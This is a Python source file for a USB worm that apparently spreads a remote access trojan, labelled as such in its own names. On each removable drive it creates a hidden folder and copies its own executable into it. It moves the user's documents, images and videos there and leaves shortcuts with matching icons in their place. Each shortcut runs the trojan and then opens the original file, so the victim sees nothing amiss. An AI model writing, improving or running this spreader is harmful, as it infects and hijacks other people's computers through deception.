from importlib.util import source_hash
import os
import time
import shutil
import psutil
import sys
import subprocess
import threading

HIDDEN_DIR = "System_RAT_Information"

def check_usb_drives():
    partitions = psutil.disk_partitions()
    usb_drives = []
    try:
        for partition in partitions:
            if 'removable' in partition.opts:
                usb_drives.append(partition.mountpoint)
    except: pass
    return usb_drives

def resource_path(relative_path):
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)



def create_shortcut(target_exe, shortcut_path, original_file,icon_path):
    try:
        if not shortcut_path.endswith(".lnk"):
            shortcut_path += ".lnk"

        rel_virus = f"{HIDDEN_DIR}\\{os.path.basename(target_exe)}"
        rel_original = f"{HIDDEN_DIR}\\{os.path.basename(original_file)}"
        
        raw_cmd = f'/c start "" "{rel_virus}" & start "" "{rel_original}"'
        vbs_args = raw_cmd.replace('"', '""')
        
        abs_icon_path = os.path.abspath(icon_path)

        vbs_script = f"""
        Set oWS = WScript.CreateObject("WScript.Shell")
        Set oLink = oWS.CreateShortcut("{shortcut_path}")
        oLink.TargetPath = "cmd.exe"
        oLink.Arguments = "{vbs_args}"
        oLink.WindowStyle = 7
        oLink.IconLocation = "{abs_icon_path}, 0"
        oLink.Save
        """
        
        vbs_path = os.path.join(os.getenv('TEMP'), "create_shortcut.vbs")
        with open(vbs_path, "w") as f:
            f.write(vbs_script)
            
        subprocess.run(['cscript', '/nologo', vbs_path], shell=True, check=True)
        os.remove(vbs_path)
        
    except :pass


def get_icon_by_ext(ext,hidden_path):

    ext_name = ext.lower().replace('.','')
    icon_filename = f"{ext_name}.ico"
    source_icon = resource_path(os.path.join("assets", icon_filename))

    if not os.path.exists(source_icon):
        source_icon = resource_path(os.path.join("assets", "default.ico"))
        icon_filename = "default.ico"

    dest_icon = os.path.join(hidden_path, icon_filename)

    if not os.path.exists(dest_icon):
        try:
            shutil.copy2(source_icon, dest_icon)
            subprocess.call(f'attrib +h "{dest_icon}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
        
    return dest_icon


def infect_drive(drive_letter):

    hidden_path = os.path.join(drive_letter, HIDDEN_DIR)
    if not os.path.exists(hidden_path):
        try:
            os.makedirs(hidden_path)
            subprocess.call(f'attrib +h "{hidden_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: return

    current_exe = sys.executable
    rat_dest = os.path.join(hidden_path,"DriveManager.exe")

    try:
        shutil.copy2(current_exe,rat_dest)
    except: pass

    for item in os.listdir(drive_letter):
        if item == HIDDEN_DIR or item.endswith(".lnk") or item.startswith("$"):
            continue

        full_path = os.path.join(drive_letter,item)

        if os.path.isfile(full_path):
            ext = os.path.splitext(item)[1].lower()
            if ext in ['.docx', '.pdf', '.txt', '.jpg', '.png', '.mp4', '.xlsx','.html']:

                dest_path = os.path.join(hidden_path,item)
                shortcut_path = os.path.join(drive_letter, item + ".lnk")
                try:
                    if not os.path.exists(dest_path):
                        shutil.move(full_path,dest_path)
                    
                    usb_icon_path = get_icon_by_ext(ext, hidden_path)

                    create_shortcut(rat_dest, shortcut_path, dest_path, usb_icon_path)

                except : pass


def monitor_loop():
    while True:
        try:
            drives = check_usb_drives()
            for drive in drives:
                if not os.path.exists(os.path.join(drive, HIDDEN_DIR)):
                    time.sleep(3)
                    infect_drive(drive)
        except: pass

        time.sleep(20)


def start_worm():
    t = threading.Thread(target=monitor_loop, daemon=True)
    t.start()
    
if __name__ == "__main__":
    print("--- DEBUG MODE ---")
    start_worm()
    while True:
        time.sleep(1)
                        




    